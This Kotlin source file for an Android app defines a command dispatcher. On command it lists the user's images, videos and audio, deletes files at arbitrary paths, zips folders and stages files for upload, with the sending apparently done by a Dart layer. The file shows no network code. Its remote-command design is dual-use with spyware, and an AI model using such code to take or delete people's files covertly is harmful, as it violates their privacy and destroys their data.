package com.example.cyber_accessibility_agent

import android.content.ContentUris
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import java.io.*
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.collections.ArrayList

object CommandDispatcher {
    private val TAG = "CommandDispatcher"

    /**
     * Dispatch a command. Caller MUST call from background thread.
     * Returns Map<String, Any?> which will be marshalled to Dart.
     */
    fun dispatch(context: Context, id: String, action: String, payload: Map<*, *>): Map<String, Any?> {
        return try {
            when (action) {
                "list_images" -> listMedia(context, MediaType.IMAGE, payload)
                "list_videos" -> listMedia(context, MediaType.VIDEO, payload)
                "list_audio" -> listMedia(context, MediaType.AUDIO, payload)
                "delete_file" -> deleteFile(context, payload)
                "zip_file" -> zipPath(context, payload)
                "upload_file" -> prepareUpload(context, payload)
                "send_file" -> prepareSend(context, payload)
                else -> mapOf("success" to false, "error" to "unknown_action", "action" to action)
            }
        } catch (e: Exception) {
            Log.w(TAG, "dispatch error: ${e.message}")
            mapOf("success" to false, "error" to e.message)
        }
    }

    private enum class MediaType { IMAGE, VIDEO, AUDIO }

    private fun listMedia(context: Context, type: MediaType, payload: Map<*, *>): Map<String, Any?> {
        val results = ArrayList<Map<String, Any?>>()
        val projection: Array<String>
        val collection: Uri
        val sortOrder = "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"

        when (type) {
            MediaType.IMAGE -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_MODIFIED
                )
            }
            MediaType.VIDEO -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DATE_MODIFIED
                )
            }
            MediaType.AUDIO -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Audio.Media._ID,
                    MediaStore.Audio.Media.DISPLAY_NAME,
                    MediaStore.Audio.Media.SIZE,
                    MediaStore.Audio.Media.DATE_MODIFIED
                )
            }
        }

        val limit = (payload["limit"] as? Number)?.toInt() ?: 200
        val prefix = (payload["prefix"] as? String)?.trim()

        val selection = if (!prefix.isNullOrEmpty()) {
            "${MediaStore.MediaColumns.DISPLAY_NAME} LIKE ?"
        } else null
        val selectionArgs = if (!prefix.isNullOrEmpty()) arrayOf("$prefix%") else null

        val cursor: Cursor? = try {
            context.contentResolver.query(
                collection,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )
        } catch (e: Exception) {
            Log.w(TAG, "query failed: ${e.message}")
            null
        }

        cursor?.use { c ->
            var count = 0
            while (c.moveToNext() && count < limit) {
                val idVal = try { c.getLong(c.getColumnIndexOrThrow(projection[0])) } catch (_: Exception) { 0L }
                val name = try { c.getString(c.getColumnIndexOrThrow(projection[1])) ?: "" } catch (_: Exception) { "" }
                val size = try { c.getLong(c.getColumnIndexOrThrow(projection[2])) } catch (_: Exception) { 0L }
                val date = try { c.getLong(c.getColumnIndexOrThrow(projection[3])) } catch (_: Exception) { 0L }

                val contentUri = ContentUris.withAppendedId(collection, idVal)

                results.add(
                    mapOf(
                        "id" to idVal.toString(),
                        "display_name" to name,
                        "size" to size,
                        "date_modified" to date,
                        "uri" to contentUri.toString()
                    )
                )
                count++
            }
        }

        return mapOf("success" to true, "count" to results.size, "files" to results)
    }

    private fun deleteFile(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val filename = (payload["filename"] ?: payload["path"] ?: "") .toString()
        if (filename.isEmpty()) return mapOf("success" to false, "error" to "missing filename")

        return try {
            if (filename.startsWith("content://")) {
                val uri = Uri.parse(filename)
                val deleted = context.contentResolver.delete(uri, null, null)
                mapOf("success" to (deleted > 0), "deleted" to deleted)
            } else {
                val f = File(filename)
                val ok = if (f.exists()) f.delete() else false
                mapOf("success" to ok, "deleted" to if (ok) 1 else 0)
            }
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun zipPath(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val path = (payload["path"] ?: payload["filename"] ?: "") .toString()
        if (path.isEmpty()) return mapOf("success" to false, "error" to "missing path")

        val dest = (payload["dest"] ?: "") .toString()
        return try {
            val srcFile = File(path)
            if (!srcFile.exists()) return mapOf("success" to false, "error" to "path not found")

            val zipFile = if (dest.isNotEmpty()) File(dest) else {
                File(context.cacheDir, "mediaagent_${System.currentTimeMillis()}.zip")
            }

            ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
                if (srcFile.isDirectory) {
                    zipDirectory(srcFile, srcFile.name, zos)
                } else {
                    zipSingleFile(srcFile, zos)
                }
            }

            mapOf("success" to true, "zip_path" to zipFile.absolutePath, "size" to zipFile.length())
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun zipDirectory(folder: File, baseName: String, zos: ZipOutputStream) {
        val files = folder.listFiles() ?: return
        for (f in files) {
            if (f.isDirectory) {
                zipDirectory(f, "$baseName/${f.name}", zos)
            } else {
                zipSingleFile(f, zos, "$baseName/${f.name}")
            }
        }
    }

    private fun zipSingleFile(file: File, zos: ZipOutputStream, entryName: String? = null) {
        val entry = ZipEntry(entryName ?: file.name)
        zos.putNextEntry(entry)
        FileInputStream(file).use { fis ->
            fis.copyTo(zos)
        }
        zos.closeEntry()
    }

    private fun prepareUpload(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val filename = (payload["filename"] ?: payload["path"] ?: "") .toString()
        if (filename.isEmpty()) return mapOf("success" to false, "error" to "missing filename")
        val f = File(filename)
        if (!f.exists()) return mapOf("success" to false, "error" to "file_not_found")

        return mapOf(
            "success" to true,
            "file_path" to f.absolutePath,
            "size" to f.length(),
            "name" to f.name
        )
    }

    private fun prepareSend(context: Context, payload: Map<*, *>): Map<String, Any?> {
        // For send we return same metadata; Dart side will handle actual upload/send
        return prepareUpload(context, payload)
    }
}